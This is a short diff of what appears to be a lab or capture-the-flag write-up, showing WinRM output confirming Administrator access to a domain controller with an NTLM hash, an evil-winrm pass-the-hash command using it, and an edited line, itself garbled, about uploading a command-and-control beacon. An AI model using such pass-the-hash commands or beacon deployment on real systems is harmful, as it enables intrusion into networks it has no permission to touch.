@@ -712,11 +712,7 @@ WINRM       10.10.10.4      5985   DC               [*] Windows 11 / Server 2025
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.10.4      5985   DC               [+] darkhaven.tech\Administrator:b38a41e844c5c3d706c1e9e575f3e62c (Pwn3d!)
 ```
-Ill now generate the beacon for my root DC listener
-
-![403](Pasted%20image%2020260419194153.png)
-
-Ive changed my last listener for the root DC to TCP since it doesnt seem to connect over http
+I can winrm makes it easy to upload the beacon!
 
 ```python
 evil-winrm -i dc.darkhaven.tech -u Administrator -H 'b38a41e844c5c3d706c1e9e575f3e62c'
